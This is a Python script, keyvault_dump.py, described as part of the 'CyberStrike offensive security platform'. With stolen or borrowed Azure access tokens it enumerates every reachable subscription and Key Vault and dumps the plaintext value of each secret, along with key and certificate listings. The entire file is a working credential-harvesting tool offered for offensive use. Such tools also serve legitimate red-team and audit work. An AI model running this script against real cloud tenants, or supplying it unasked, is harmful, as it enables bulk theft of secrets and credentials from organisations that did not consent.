#!/usr/bin/env python3
"""
keyvault_dump.py — Azure Key Vault Secret Extraction

Discovers and extracts secrets, keys, and certificates from all accessible
Azure Key Vaults.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

ARM_BASE = "https://management.azure.com"


class KeyVaultDumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.token = args.token or os.environ.get("AZURE_ACCESS_TOKEN", "")
        self.vault_token = args.vault_token or os.environ.get("AZURE_VAULT_TOKEN", "")
        self.secrets_count = 0
        self.vaults_count = 0

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Azure Key Vault Dump")
        print("=" * 70)
        print(f"PID:         {os.getpid()}")
        print(f"ARM token:   {'set' if self.token else 'NOT SET'}")
        print(f"Vault token: {'set' if self.vault_token else 'NOT SET'}")
        print(f"Output:      {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:     {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            rtype = record.get("type", "info")
            name = record.get("name", "unknown")
            detail = record.get("detail", "")
            print(f"[{rtype.upper():<12}] {name:<50} {detail}", flush=True)
            if record.get("value") and not self.args.json_output:
                val = record["value"]
                if len(str(val)) > 100:
                    val = str(val)[:100] + "..."
                print(f"  -> value: {val}", flush=True)

    def arm_headers(self):
        return {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}

    def vault_headers(self):
        return {"Authorization": f"Bearer {self.vault_token}", "Content-Type": "application/json"}

    def list_vaults(self):
        vaults = []
        url = f"{ARM_BASE}/subscriptions?api-version=2022-12-01"
        r = requests.get(url, headers=self.arm_headers(), timeout=30)
        if r.status_code != 200:
            self.emit({"type": "error", "name": "subscriptions", "detail": f"HTTP {r.status_code}"})
            return vaults

        for sub in r.json().get("value", []):
            if not self.running:
                break
            sub_id = sub["subscriptionId"]
            kv_url = f"{ARM_BASE}/subscriptions/{sub_id}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"
            kv_r = requests.get(kv_url, headers=self.arm_headers(), timeout=30)
            if kv_r.status_code == 200:
                for vault in kv_r.json().get("value", []):
                    vault_uri = vault.get("properties", {}).get("vaultUri", "")
                    vaults.append({
                        "name": vault["name"],
                        "uri": vault_uri,
                        "resource_group": vault.get("id", "").split("/resourceGroups/")[1].split("/")[0] if "/resourceGroups/" in vault.get("id", "") else "",
                        "subscription_id": sub_id,
                    })
        return vaults

    def dump_secrets(self, vault_uri):
        if not self.running:
            return
        url = f"{vault_uri}secrets?api-version=7.4"
        try:
            r = requests.get(url, headers=self.vault_headers(), timeout=30)
            if r.status_code != 200:
                self.emit({"type": "error", "name": vault_uri, "detail": f"list secrets: HTTP {r.status_code}"})
                return

            for secret in r.json().get("value", []):
                if not self.running:
                    break
                secret_name = secret["id"].split("/secrets/")[-1]
                val_url = f"{vault_uri}secrets/{secret_name}?api-version=7.4"
                val_r = requests.get(val_url, headers=self.vault_headers(), timeout=30)
                if val_r.status_code == 200:
                    val_data = val_r.json()
                    self.secrets_count += 1
                    self.emit({
                        "type": "secret",
                        "name": secret_name,
                        "detail": f"content_type={val_data.get('contentType', 'N/A')}",
                        "vault": vault_uri,
                        "value": val_data.get("value"),
                        "content_type": val_data.get("contentType"),
                        "enabled": val_data.get("attributes", {}).get("enabled"),
                        "created": val_data.get("attributes", {}).get("created"),
                        "updated": val_data.get("attributes", {}).get("updated"),
                    })
                else:
                    self.emit({"type": "secret", "name": secret_name, "detail": f"access denied: HTTP {val_r.status_code}"})
        except requests.exceptions.RequestException as e:
            self.emit({"type": "error", "name": vault_uri, "detail": str(e)})

    def dump_keys(self, vault_uri):
        if not self.running:
            return
        url = f"{vault_uri}keys?api-version=7.4"
        try:
            r = requests.get(url, headers=self.vault_headers(), timeout=30)
            if r.status_code != 200:
                return
            for key in r.json().get("value", []):
                if not self.running:
                    break
                key_name = key["kid"].split("/keys/")[-1]
                self.emit({
                    "type": "key",
                    "name": key_name,
                    "detail": f"vault={vault_uri}",
                    "vault": vault_uri,
                    "kid": key["kid"],
                    "enabled": key.get("attributes", {}).get("enabled"),
                })
        except requests.exceptions.RequestException:
            pass

    def dump_certificates(self, vault_uri):
        if not self.running:
            return
        url = f"{vault_uri}certificates?api-version=7.4"
        try:
            r = requests.get(url, headers=self.vault_headers(), timeout=30)
            if r.status_code != 200:
                return
            for cert in r.json().get("value", []):
                if not self.running:
                    break
                cert_name = cert["id"].split("/certificates/")[-1]
                self.emit({
                    "type": "certificate",
                    "name": cert_name,
                    "detail": f"vault={vault_uri}",
                    "vault": vault_uri,
                    "cert_id": cert["id"],
                    "enabled": cert.get("attributes", {}).get("enabled"),
                })
        except requests.exceptions.RequestException:
            pass

    def run(self):
        self.print_banner()

        if not self.vault_token:
            print("ERROR: Vault token required. Set --vault-token or AZURE_VAULT_TOKEN.", file=sys.stderr)
            print("Get one with: az account get-access-token --resource https://vault.azure.net", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        if self.args.vault_url:
            vault_uri = self.args.vault_url.rstrip("/") + "/"
            self.vaults_count = 1
            self.dump_secrets(vault_uri)
            self.dump_keys(vault_uri)
            self.dump_certificates(vault_uri)
        elif self.token:
            vaults = self.list_vaults()
            self.vaults_count = len(vaults)
            self.emit({"type": "info", "name": "vaults", "detail": f"Found {len(vaults)} Key Vaults"})
            for vault in vaults:
                if not self.running:
                    break
                self.emit({"type": "vault", "name": vault["name"], "detail": f"uri={vault['uri']}"})
                self.dump_secrets(vault["uri"])
                self.dump_keys(vault["uri"])
                self.dump_certificates(vault["uri"])
        else:
            print("ERROR: Either --vault-url or ARM token (for vault discovery) required.", file=sys.stderr)
            sys.exit(1)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- keyvault_dump summary ---")
        print(f"Vaults scanned: {self.vaults_count}")
        print(f"Secrets extracted: {self.secrets_count}")
        print(f"Total records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract secrets, keys, and certificates from Azure Key Vaults.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 keyvault_dump.py --vault-url https://myvault.vault.azure.net --vault-token $TOKEN\n"
            "  python3 keyvault_dump.py --token $ARM_TOKEN --vault-token $VAULT_TOKEN --json-output\n"
        ),
    )
    parser.add_argument("--vault-url", type=str, default=None, help="Specific Key Vault URL")
    parser.add_argument("--token", type=str, default=None, help="Azure ARM access token (for vault discovery)")
    parser.add_argument("--vault-token", type=str, default=None, help="Azure Key Vault access token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = KeyVaultDumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
